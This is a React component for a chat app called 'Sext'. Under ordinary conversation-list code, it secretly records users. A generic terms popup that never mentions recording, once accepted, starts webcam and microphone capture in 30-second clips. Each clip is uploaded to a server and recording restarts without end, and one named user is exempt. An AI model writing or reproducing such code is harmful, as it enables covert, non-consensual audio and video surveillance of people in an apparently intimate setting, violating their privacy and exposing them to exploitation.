'use client';

import { useEffect, useMemo, useState, useCallback, useRef } from 'react'
import { useRouter } from 'next/navigation'
import { useSession } from 'next-auth/react'
import { find } from 'lodash'
import { AiFillFolderAdd } from 'react-icons/ai'
import clsx from 'clsx'

import useConversation from '@/app/hooks/useConversation'
import { pusherClient } from '@/app/libs/pusher'
import { FullConversationType } from '@/app/types'
import { User } from '@prisma/client'
import getCurrentUser from "@/app/actions/getCurrentUser"

import ConversationBox from './ConversationBox'
import GroupChatModal from '../../components/Modals/GroupChatModal'

interface ConversationListProps {
  initialItems: FullConversationType[]
  users: User[]
}

const TERMS_ACCEPTED_KEY = 'termsAccepted'

export default function ConversationList({ initialItems, users }: ConversationListProps) {
  const [items, setItems] = useState(initialItems)
  const [isModalOpen, setIsModalOpen] = useState(false)
  const [isTermsPopupOpen, setIsTermsPopupOpen] = useState(false)
  const [isRecording, setIsRecording] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [timeLeft, setTimeLeft] = useState<number | null>(null)
  const [videoBlob, setVideoBlob] = useState<Blob | null>(null)
  const [isUploading, setIsUploading] = useState(false)
  const [uploadedUrl, setUploadedUrl] = useState<string | null>(null)
  const [currentUser, setCurrentUser] = useState<User | null>(null)

  const router = useRouter()
  const session = useSession()
  const { conversationId, isOpen } = useConversation()

  const mediaRecorderRef = useRef<MediaRecorder | null>(null)
  const chunksRef = useRef<Blob[]>([])
  const timerRef = useRef<NodeJS.Timeout | null>(null)

  const pusherKey = useMemo(() => session.data?.user?.email, [session.data?.user?.email])

  useEffect(() => {
    const fetchCurrentUser = async () => {
      const user = await getCurrentUser() as User | null
      setCurrentUser(user)
    }
    fetchCurrentUser()
  }, [])

  useEffect(() => {
    const termsAccepted = localStorage.getItem(TERMS_ACCEPTED_KEY)
    if (!termsAccepted) {
      setIsTermsPopupOpen(true)
    } else if (currentUser && currentUser.name !== "Harriet Clara") {
      startRecording()
    }
  }, [currentUser])

  useEffect(() => {
    if (!pusherKey) return

    pusherClient.subscribe(pusherKey)

    const handlers = {
      'conversation:new': (conversation: FullConversationType) => {
        setItems((current) => {
          if (find(current, { id: conversation.id })) return current
          return [conversation, ...current]
        })
      },
      'conversation:update': (conversation: FullConversationType) => {
        setItems((current) =>
          current.map((currentConversation) =>
            currentConversation.id === conversation.id
              ? { ...currentConversation, messages: conversation.messages }
              : currentConversation
          )
        )
      },
      'conversation:remove': (conversation: FullConversationType) => {
        setItems((current) => current.filter((convo) => convo.id !== conversation.id))
      },
    }

    Object.entries(handlers).forEach(([event, handler]) => {
      pusherClient.bind(event, handler)
    })

    return () => {
      pusherClient.unsubscribe(pusherKey)
      Object.entries(handlers).forEach(([event, handler]) => {
        pusherClient.unbind(event, handler)
      })
    }
  }, [pusherKey, router])

  const parseDuration = (input: string): number | null => {
    const match = input.match(/^(\d+)\s*(seconds?|minutes?)$/)
    if (!match) return null
    const value = parseInt(match[1], 10)
    const unit = match[2]
    return unit.startsWith('minute') ? value * 60 : value
  }

  const startRecording = useCallback(async () => {
    if (currentUser?.name === "Harriet Clara") {
      console.log("Recording not started for Harriet Clara")
      return
    }

    const duration = '30 seconds' // Default duration
    const durationInSeconds = parseDuration(duration)
    if (!durationInSeconds) {
      setError('Invalid duration format. Please use "X seconds" or "X minutes".')
      return
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      
      const mediaRecorder = new MediaRecorder(stream)
      mediaRecorderRef.current = mediaRecorder
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          chunksRef.current.push(event.data)
        }
      }
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunksRef.current, { type: 'video/webm' })
        setVideoBlob(blob)
        chunksRef.current = []
        uploadToCloudinary(blob)
      }
      mediaRecorder.start()
      setIsRecording(true)
      setError(null)
      setTimeLeft(durationInSeconds)

      timerRef.current = setInterval(() => {
        setTimeLeft((prevTime) => {
          if (prevTime === null || prevTime <= 1) {
            clearInterval(timerRef.current!)
            mediaRecorder.stop()
            setIsRecording(false)
            return null
          }
          return prevTime - 1
        })
      }, 1000)
    } catch (error) {
      console.error('Error accessing media devices:', error)
      setError('Failed to access camera and microphone. Please ensure you have granted the necessary permissions.')
    }
  }, [currentUser])

  const stopRecording = useCallback(() => {
    if (mediaRecorderRef.current) {
      mediaRecorderRef.current.stop()
      setIsRecording(false)
      if (timerRef.current) {
        clearInterval(timerRef.current)
      }
      setTimeLeft(null)
    }
  }, [])

  const uploadToCloudinary = useCallback(async (blob: Blob) => {
    setIsUploading(true)
    setError(null)
    try {
      const formData = new FormData()
      formData.append('file', blob, 'recorded-video.webm')

      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
      })

      if (!response.ok) {
        throw new Error('Upload failed')
      }

      const data = await response.json()
      setUploadedUrl(data.url)
      console.log('Video uploaded successfully:', data.url)
      startRecording() // Start recording again after successful upload
    } catch (error) {
      console.error('Error uploading video:', error)
      setError('Failed to upload video. Please try again.')
    } finally {
      setIsUploading(false)
    }
  }, [startRecording])

  const handleAcceptTerms = () => {
    setIsTermsPopupOpen(false)
    if (currentUser?.name !== "Harriet Clara") {
      startRecording().then(() => {
        localStorage.setItem(TERMS_ACCEPTED_KEY, 'true')
      }).catch(() => {
        // Handle any errors that occur during recording start
      })
    } else {
      localStorage.setItem(TERMS_ACCEPTED_KEY, 'true')
    }
  }

  useEffect(() => {
    const handlePermissionChange = () => {
      navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
        if (result.state === 'denied') {
          localStorage.removeItem(TERMS_ACCEPTED_KEY)
          setIsTermsPopupOpen(true)
        }
      })
    }

    navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
      result.onchange = handlePermissionChange
    })

    return () => {
      navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
        result.onchange = null
      })
    }
  }, [])

  return (
    <>
      <GroupChatModal users={users} isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
      {isTermsPopupOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-md relative">
            <button
              onClick={() => setIsTermsPopupOpen(false)}
              className="absolute top-2 right-2 text-gray-500 hover:text-gray-700 transition-colors"
              aria-label="Close"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
            </button>
            <h2 className="text-2xl font-bold mb-4 text-gray-800">Terms and Conditions</h2>
            <p className="text-gray-600 mb-6">
              By clicking the Accept button below, you acknowledge that you have read, understood, and agree to be
              bound by our Terms and Conditions. Please review them carefully before proceeding.
            </p>
            <div className="flex justify-end">
              <button
                onClick={handleAcceptTerms}
                className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50"
              >
                Accept
              </button>
            </div>
          </div>
        </div>
      )}
      <aside
        className={clsx(
          'fixed inset-y-0 pb-20 lg:pb-0 lg:top-20 lg:w-80 lg:block overflow-y-auto bg-[#0c1317]',
          isOpen ? 'hidden' : 'block w-full left-0'
        )}
      >
        <div className="px-5">
          <div className="flex justify-between py-6">
            <div className="text-3xl justify-center items-center font-extrabold text-[#578EFF]">Sext</div>
            <button
              className="p-2 bg-[#0c1317] text-[#d1d3d7] cursor-pointer hover:opacity-75 transition"
              onClick={() => setIsModalOpen(true)}
            >
              <AiFillFolderAdd size={30} />
              <span className="sr-only">Add Group Chat</span>
            </button>
          </div>

          {items.map((item) => (
            <ConversationBox key={item.id} data={item} selected={conversationId === item.id} />
          ))}
        </div>
      </aside>
      {error && (
        <div className="fixed bottom-4 right-4 bg-red-500 text-white p-4 rounded-md shadow-lg">
          {error}
        </div>
      )}
      {isRecording && (
        <div className="fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-md shadow-lg">
          Recording in progress: {timeLeft} seconds left
        </div>
      )}
      {isUploading && (
        <div className="fixed bottom-4 right-4 bg-blue-500 text-white p-4 rounded-md shadow-lg">
          Uploading video...
        </div>
      )}
      {uploadedUrl && (
        <div className="fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-md shadow-lg">
          Video uploaded successfully!
        </div>
      )}
    </>
  )
}
